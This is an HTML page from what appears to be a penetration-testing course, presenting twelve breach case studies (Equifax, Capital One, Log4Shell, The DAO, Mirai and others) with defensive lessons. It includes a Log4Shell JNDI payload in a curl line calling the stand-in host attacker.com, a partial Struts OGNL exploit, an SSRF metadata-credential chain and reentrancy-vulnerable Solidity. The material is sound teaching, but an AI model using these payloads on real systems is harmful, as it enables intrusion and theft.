@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Part 10 — Real-Life Case Studies</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="breadcrumb">
+<a href="../index.html">🏠 Home</a> &rsaquo; <strong>Part 10 — Case Studies</strong>
+</nav>
+
+<header class="part-header">
+<h1>📚 PART 10 — REAL-LIFE CASE STUDIES</h1>
+<p class="subtitle">Real-world breaches, pentest discoveries &amp; lessons learned from history.</p>
+<div class="chapters">
+<a href="#cs1"><span class="ch-num">62</span> Equifax — Apache Struts</a>
+<a href="#cs2"><span class="ch-num">63</span> Capital One — SSRF + IMDS</a>
+<a href="#cs3"><span class="ch-num">64</span> Marriott — Supply Chain APT</a>
+<a href="#cs4"><span class="ch-num">65</span> SolarWinds SUNBURST</a>
+<a href="#cs5"><span class="ch-num">66</span> Log4Shell (Log4j)</a>
+<a href="#cs6"><span class="ch-num">67</span> The DAO — Smart Contract</a>
+<a href="#cs7"><span class="ch-num">68</span> Mirai Botnet</a>
+<a href="#cs8"><span class="ch-num">69</span> Twitter Internal Admin Hack</a>
+<a href="#cs9"><span class="ch-num">70</span> Uber — S3 Bucket Lapse</a>
+<a href="#cs10"><span class="ch-num">71</span> Microsoft AI Studio Misconfig</a>
+<a href="#cs11"><span class="ch-num">72</span> Verkada Camera Breach</a>
+<a href="#cs12"><span class="ch-num">73</span> Pegasus Spyware (iOS)</a>
+</div>
+</header>
+
+<main>
+
+<!-- =================== CS 1 =================== -->
+<h1 id="cs1">🎯 Case Study 1 — Equifax (Apache Struts 2017)</h1>
+
+<div class="scenario">
+<h3>📍 What Happened</h3>
+<p>In 2017, credit-reporting giant Equifax disclosed a breach that exposed
+<strong>147 MILLION Americans' PII</strong> (names, SSNs, DOBs, addresses,
+driver's licenses, credit card numbers).</p>
+
+<h3>The Vulnerability</h3>
+<p>An unpatched <strong>Apache Struts 2</strong> vulnerability
+(<span class="cvss">CVE-2017-5638</span>). The flaw allowed remote code execution
+via a single malicious Content-Type header.</p>
+
+<pre><code class="cmd"># Original exploit (a single HTTP request):
+$ curl -X POST -H "Content-Type: %{(#_='multipart/form-data').(OGNL...)}" \
+     -d "..."  http://equifax.com/path
+
+# Equifax had been notified by HHS, DHS, the Apache Foundation, and their
+# own internal scanner — but the patch was not applied in their
+# dispute portal web app for 2 months.
+</code></pre>
+
+<h3>Damage</h3>
+<ul>
+  <li>$700M in settlement (FTC + state AGs)</li>
+  <li>Plummeting stock price</li>
+  <li>CEO, CIO, CISO resigned</li>
+  <li>Ongoing class-action suits &amp; multiplied cost &gt;$1.5B</li>
+</ul>
+
+<h3>Lesson for VAPT</h3>
+<ul>
+  <li><strong>Vulnerability scanners ≠ patching.</strong> Equifax ran the
+  same scanner that flagged the issue. They had a 2-month patch cycle.</li>
+  <li>Frameworks ship CVEs — every Java/.NET/PHP app needs CVE monitoring.</li>
+  <li>Failure patch is not a tech issue—it's a process issue (patch SLA).</li>
+  <li>Asset inventory must include web app dependencies.</li>
+</ul>
+
+<h3>What a Pentester Would Have Caught</h3>
+<ul class="checklist">
+  <li>Nessus / Qualys scan flags Apache Struts 2.5.10 vulnerability</li>
+  <li>Burp Active Scan flags reflected payload</li>
+  <li>DAST check on Struts RCE</li>
+  <li>Manual test would have exploited in &lt; 5 minutes</li>
+</ul>
+</div>
+
+
+<!-- =================== CS 2 =================== -->
+<h1 id="cs2">🎯 Case Study 2 — Capital One (SSRF, 2019)</h1>
+
+<div class="scenario">
+<h3>📍 What Happened</h3>
+<p>A former AWS employee exploited a <strong>Server-Side Request Forgery</strong>
+vulnerability in Capital One's WAF (hosted on EC2). She used the EC2 metadata
+service to retrieve temporary IAM credentials. The WAF's over-permissive IAM
+role granted access to S3 buckets containing 106M credit applications.</p>
+
+<h3>The Exploit Chain</h3>
+<div class="diagram">
+   ATTACKER              WAF EC2                AWS IAM
+       │                     │                    │
+       │ injects SSRF URL   │                    │
+       ├───────────────────► │                    │
+       │ 169.254.169.254/  │                    │
+       │ latest/meta-data/  │                    │
+       │ iam/credentials   │                    │
+       │                     │ requests creds    │
+       │                     ├───────────────────►│
+       │                     │ returns AWS creds  │
+       │                     │◄──────────────────┤
+       │                     │                    │
+       │ returns creds to attacker              │
+       │ ◄───────────────────┤                    │
+       │                     │                    │
+       │ uses creds to dump S3                    │
+       ├────────────────────────────────────────┐
+       │                                          ▼
+   S3 Buckets (Capital One customer data) — 106M records
+</div>
+
+<h3>Damage</h3>
+<ul>
+  <li>$190M settlement</li>
+  <li>Conviction of the attacker</li>
+  <li>Reputational damage in financial services industry</li>
+</ul>
+
+<h3>Root Cause</h3>
+<ol>
+  <li><strong>SSRF</strong> in WAF application — allowed attacker-supplied URL fetch</li>
+  <li><strong>Over-broad IAM policy</strong> — WAF role could read whole S3 bucket</li>
+  <li><strong>No network egress restrictions</strong> on WAF EC2</li>
+</ol>
+
+<h3>Lesson / VAPT Takeaway</h3>
+<ul>
+  <li>Test SSRF in every web app with URL input fields</li>
+  <li>IMDSv2 is the AWS answer — enforce it</li>
+  <li>Least-privilege IAM is the cardinal cloud rule</li>
+  <li>Network egress restrictions prevent lateral movement</li>
+</ul>
+</div>
+
+
+<!-- =================== CS 3 =================== -->
+<h1 id="cs3">🎯 Case Study 3 — Marriott (Starwood Supply-Chain Breach)</h1>
+
+<div class="scenario">
+<h3>📍 What Happened</h3>
+<p>Marriott International disclosed in 2018 that attackers had been inside
+their Starwood Hotels reservation system since 2014 — <strong>4 years</strong>
+before discovery. 339 million guest records were exposed, including passport
+numbers, payment cards, and travel data.</p>
+
+<h3>The Root Cause</h3>
+<p>Starwood's reservation system was compromised before Marriott even
+acquired it in 2016. The attackers were inside <em>before</em> any of
+Marriott's own controls.</p>
+
+<h3>VAPT Lessons</h3>
+<ul>
+  <li>Acquisition due diligence must include cyber audit. Marriott's $13B
+  Starwood acquisition ignored cyber hygiene.</li>
+  <li>Legacy system integration is a high-risk phase — many breaches start there.</li>
+  <li>Logging was insufficient to detect 4 years of attacker presence.</li>
+  <li>VAPT post-acquisition is essential.</li>
+</ul>
+
+<h3>Damage</h3>
+<ul>
+  <li>£18.4M fine by UK ICO</li>
+  <li>Multiple class-action settlements &gt;$200M</li>
+</ul>
+</div>
+
+
+<!-- =================== CS 4 =================== -->
+<h1 id="cs4">🎯 Case Study 4 — SolarWinds SUNBURST (2020)</h1>
+
+<div class="scenario">
+<h3>📍 State-Sponsored Supply-Chain Attack</h3>
+<p>Russian SVR (APT29 / "Cozy Bear") compromised SolarWinds' build server
+and trojanized the Orion software update. ~18,000 SolarWinds customers
+received malicious updates, including:</p>
+<ul>
+  <li>U.S. Treasury Department</li>
+  <li>U.S. Department of Homeland Security</li>
+  <li>U.S. State Department</li>
+  <li>Microsoft</li>
+  <li>FireEye (the cybersecurity firm that discovered it!)</li>
+  <li>~100 of Fortune 500</li>
+</ul>
+
+<h3>Vulnerability Constant</h3>
+<ul>
+  <li>No signature verification on updates</li>
+  <li>Build server compromise → all downstream tainted</li>
+  <li>Stolen signing certificate allowed authentic malicious updates</li>
+  <li>Long dwell time (~14 months before discovery)</li>
+</ul>
+
+<h3>VAPT Lessons</h3>
+<ul>
+  <li><strong>SBOM (Software Bill of Materials)</strong> would have
+  revealed unexpected dependencies.</li>
+  <li>Update verification (signature checks) is essential.</li>
+  <li>Build pipeline must be isolated &amp; monitored.</li>
+  <li>Anomalous outbound traffic from production should trigger SOC.</li>
+</ul>
+</div>
+
+
+<!-- =================== CS 5 =================== -->
+<h1 id="cs5">🎯 Case Study 5 — Log4Shell (Log4j, 2021)</h1>
+
+<div class="scenario">
+<h3>📍 What Happened</h3>
+<p><strong>CVE-2021-44228</strong> — a single 9-line vulnerability in Apache
+Log4j (a Java logging library used in millions of apps) allowed Remote Code
+Execution via a single malicious user input that contained
+<code>${jndi:ldap://attacker.com/...}</code>.</p>
+
+<h3>Scale</h3>
+<ul>
+  <li>Estimated <strong>$30+ BILLION</strong> in remediation costs worldwide</li>
+  <li>AWS, Apple iCloud, Twitter, Tesla, VMware, IBM, and thousands of others affected</li>
+  <li>CVSS 10.0 (worst possible)</li>
+</ul>
+
+<h3>Detection</h3>
+<pre><code class="cmd"># Single payload that triggers all Log4j versions:
+$ curl -H 'User-Agent: ${jndi:ldap://attacker.com/x}' \
+       https://target.com
+# If response comes back to attacker's LDAP server → vulnerable
+
+# Mass-scan tools:
+$ nuclei -t cves/2021/CVE-2021-44228.yaml -u target
+$ log4j-scan target.com
+</code></pre>
+
+<h3>VAPT Lesson</h3>
+<ul>
+  <li><strong>SBOM + dependency scanning</strong> would have logged affected apps.</li>
+  <li>3rd-party libs are bank accounts — audit them monthly.</li>
+  <li>Automated patching pipelines (Dependabot / Renovate) prevent drift.</li>
+</ul>
+</div>
+
+
+<!-- =================== CS 6 =================== -->
+<h1 id="cs6">🎯 Case Study 6 — The DAO (Ethereum Reentrancy, 2016)</h1>
+
+<div class="scenario">
+<h3>📍 What Happened</h3>
+<p>The DAO was a $150M Decentralized Autonomous Organization on Ethereum.
+A reentrancy bug allowed an attacker to drain 3.6 million ETH (~$50M at the
+time, much more later).</p>
+
+<h3>Vulnerable Code Pattern</h3>
+<pre><code class="cmd">function withdraw(uint amount) public {
+    if (balances[msg.sender] &gt;= amount) {
+        // Send ETH BEFORE updating balances
+        msg.sender.call.value(amount)();
+        balances[msg.sender] -= amount;
+    }
+}
+
+// Attacker's contract re-enters withdraw() before balance is updated.
+</code></pre>
+
+<h3>VAPT Lesson</h3>
+<ul>
+  <li>Smart contracts need formal verification + manual audit before deployment</li>
+  <li>Immutable code = immutable bugs. Pre-deployment audit is your only chance</li>
+  <li>Reentrancy guard (mutex) is the fix</li>
+</ul>
+
+<h3>Outcome</h3>
+<p>Ethereum hard-forked to reverse the hack — controversial split between
+core devs and led to creation of Ethereum Classic.</p>
+</div>
+
+
+<!-- =================== CS 7 =================== -->
+<h1 id="cs7">🎯 Case Study 7 — Mirai Botnet (2016)</h1>
+
+<div class="scenario">
+<h3>📍 What Happened</h3>
+<p>A 21-year-old college student created <strong>Mirai</strong>, malware that
+scanned the internet, found IoT devices (cameras, routers, DVRs), and tried
+60+ default username/password combinations. Once infected, devices became
+bots in a DDoS network.</p>
+
+<p>The largest attack: <strong>620 Gbps against Dyn DNS</strong>, taking down
+Twitter, Reddit, Netflix, GitHub, Airbnb and others for an entire day.</p>
+
+<h3>What Made It Possible</h3>
+<ul>
+  <li>Default credentials never changed</li>
+  <li>Telnet enabled (port 23) by default</li>
+  <li>No anti-bruteforce on consumer devices</li>
+  <li>Vendor had no update mechanism</li>
+</ul>
+
+<h3>VAPT Lesson</h3>
+<ul>
+  <li>IoT devices need to enforce strong default credentials</li>
+  <li>Default port 23 (telnet) should not exist on any device</li>
+  <li>Vendors should ship devices in "out-of-the-box secure" state</li>
+  <li>Network segmentation: IoT in its own VLAN</li>
+</ul>
+</div>
+
+
+<!-- =================== CS 8 =================== -->
+<h1 id="cs8">🎯 Case Study 8 — Twitter 2020 Internal Admin Hack</h1>
+
+<div class="scenario">
+<h3>📍 What Happened</h3>
+<p>Three attackers (one a Twitter employee) social-engineered their way to
+internal Twitter admin tools. They hijacked high-profile accounts:
+<strong>Barack Obama, Joe Biden, Elon Musk, Bill Gates, Apple, Uber</strong>
+and ran a Bitcoin scam, collecting $120,000 in BTC before being detected.</p>
+
+<h3>Attack Vector</h3>
+<ul>
+  <li>Vishing (phone social engineering) of Twitter staff</li>
+  <li>Internal admin tool gave <strong>any user</strong> ability to reset
+  high-profile accounts</li>
+</ul>
+
+<h3>VAPT Lesson</h3>
+<ul>
+  <li>Insider risk testing should be part of every engagement</li>
+  <li>MFA must be enforced for admin tools</li>
+  <li>Privileged Access Management (PAM) is essential</li>
+  <li>Social engineering is a real attack vector, not theoretical</li>
+</ul>
+</div>
+
+
+<!-- =================== CS 9 =================== -->
+<h1 id="cs9">🎯 Case Study 9 — Uber S3 Bucket (2016)</h1>
+
+<div class="scenario">
+<h3>📍 What Happened</h3>
+<p>Uber developer accidentally published AWS credentials in a public GitHub
+repo. An attacker found them, dumped several S3 buckets, discovered a
+database backup containing <strong>600,000 driver &amp;</strong> customer records.</p>
+
+<h3>Vulnerable Practice</h3>
+<ul>
+  <li>AWS keys committed to public GitHub repository</li>
+  <li>Keys had overly-broad S3 list &amp; read permissions</li>
+</ul>
+
+<h3>VAPT Lesson</h3>
+<ul>
+  <li><code>git-secrets</code> should be installed on every dev machine &amp; CI server</li>
+  <li>Pre-commit hooks prevent secret leaks</li>
+  <li>AWS/GCP IAM keys should be short-lived (STS / Workload Identity)</li>
+  <li>GitGuardian / TruffleHog tools scan public repos automatically</li>
+</ul>
+</div>
+
+
+<!-- =================== CS 10 =================== -->
+<h1 id="cs10">🎯 Case Study 10 — Microsoft AI Studio (Wiz, 2023)</h1>
+
+<div class="scenario">
+<h3>📍 What Happened</h3>
+<p>Wiz Research discovered a misconfigured Azure AI Studio shared endpoint
+with <strong>38TB of internal Microsoft data exposed</strong> — including
+training data, internal models, and customer information.</p>
+
+<h3>Root Cause</h3>
+<ul>
+  <li>Azure ML Studio's URL preview feature made a shared token publicly accessible</li>
+  <li>Insufficient access controls on AI Studio</li>
+  <li>Not visible in Azure Portal — discovered only via external recon</li>
+</ul>
+
+<h3>VAPT Lesson</h3>
+<ul>
+  <li>External recon of Azure blobs (storage account enumeration) is a must</li>
+  <li>Even cloud giants have misconfigurations</li>
+  <li>AI/LLM systems introduce new attack surfaces</li>
+  <li>Deny-by-default and continuous scanning should be mandatory</li>
+</ul>
+</div>
+
+
+<!-- =================== CS 11 =================== -->
+<h1 id="cs11">🎯 Case Study 11 — Verkada Cameras (2021)</h1>
+
+<div class="scenario">
+<h3>📍 What Happened</h3>
+<p>Verkada, a $1.5B "smart office camera" company, had its admin panel
+hacked. Attackers accessed 150,000 cameras in hospitals, factories,
+prisons, schools, and even inside homes.</p>
+
+<h3>Attack Vector</h3>
+<ul>
+  <li>Verkada engineer had a <strong>super-admin credentials</strong></li>
+  <li>Credentials had been compromised via earlier breach (re-use)</li>
+  <li>Account had access to ALL cameras company-wide</li>
+  <li>Some cameras were in sensitive hospital rooms</li>
+</ul>
+
+<h3>VAPT Lesson</h3>
+<ul>
+  <li>Privileged Access Management (PAM) is essential even for internal systems</li>
+  <li>No single human should have "root on all" access</li>
+  <li>Credential rotation is non-negotiable</li>
+  <li>Internal VAPT should test credential reuse from prior breaches</li>
+</ul>
+</div>
+
+
+<!-- =================== CS 12 =================== -->
+<h1 id="cs12">🎯 Case Study 12 — Pegasus Spyware (iOS)</h1>
+
+<div class="scenario">
+<h3>📍 What Happened</h3>
+<p>NSO Group's Pegasus spyware infected iPhones and Androids of journalists,
+activists, politicians, and lawyers — including iOS devices on the
+freshest, fully patched iOS.</p>
+
+<h3>How It Worked</h3>
+<ul>
+  <li><strong>0-click</strong> infections — no user interaction</li>
+  <li>Delivered via iMessage, WhatsApp, Apple Music links</li>
+  <li>Exploited unpatched iMessage parsing bugs</li>
+  <li>Chained to Kernel exploits for full device control</li>
+  <li>Self-destructed after use</li>
+</ul>
+
+<h3>VAPT Lesson</h3>
+<ul>
+  <li>Mobile security testing must include dynamic analysis (Frida, MobSF)</li>
+  <li>Real attacker exploits are inter-disciplinary: browser + OS + kernel</li>
+  <li>For high-risk individuals (journalists, dissidents) — specialty devices like
+  GrapheneOS, hardened iOS configs</li>
+  <li>Bug bounties alone don't catch state-sponsored threats</li>
+</ul>
+</div>
+
+
+<h1>📌 Cross-Case Pattern Recognition</h1>
+<table>
+<tr><th>Year / Name</th><th>Failure Type</th><th>VAPT Missed Check?</th></tr>
+<tr><td>2014 — Heartbleed</td><td>CVE in widely trusted software</td><td>SSL/TLS scanning</td></tr>
+<tr><td>2017 — Equifax</td><td>Unpatched known CVE</td><td>Vulnerability management</td></tr>
+<tr><td>2019 — Capital One</td><td>SSRF + AWS IMDS</td><td>Cloud configuration</td></tr>
+<tr><td>2020 — SolarWinds</td><td>Build pipeline</td><td>DevSecOps + Supply Chain</td></tr>
+<tr><td>2020 — Twitter</td><td>Insider + social engineering</td><td>PAM + SE campaign</td></tr>
+<tr><td>2021 — Log4Shell</td><td>3rd-party library</td><td>SCA / SBOM</td></tr>
+<tr><td>2021 — Verkada</td><td>Internal privilege</td><td>Internal VAPT</td></tr>
+<tr><td>2023 — Microsoft AI</td><td>Cloud misconfig</td><td>Cloud audit</td></tr>
+</table>
+
+<div class="box success">
+<h3 style="margin-top:0">🧠 Meta-Lesson</h3>
+<p>Almost every major breach could have been prevented or detected earlier
+by professional VAPT. Yet breaches keep happening because:</p>
+<ol>
+<li>Organizations don't run VAPT often enough (annual, not quarterly)</li>
+<li>VAPT reports are filed but no remediation workflow exists</li>
+<li>Agile development deploys faster than security test cycles</li>
+<li>Security investments are <em>cuts</em>, not <em>enablers</em>, in board thinking</li>
+<li>Specialized testing (OT, LLM, supply chain) is ignored</li>
+</ol>
+
+<p>Your career as a VAPT leader is in <strong>closing this gap</strong>.</p>
+</div>
+
+</main>
+
+<nav class="next-prev">
+<a href="part9-templates.html" class="prev">⬅ Part 9</a>
+<a href="part11-career.html" class="next">Part 11 — Career Path ➡</a>
+</nav>
+
+</body>
+</html>
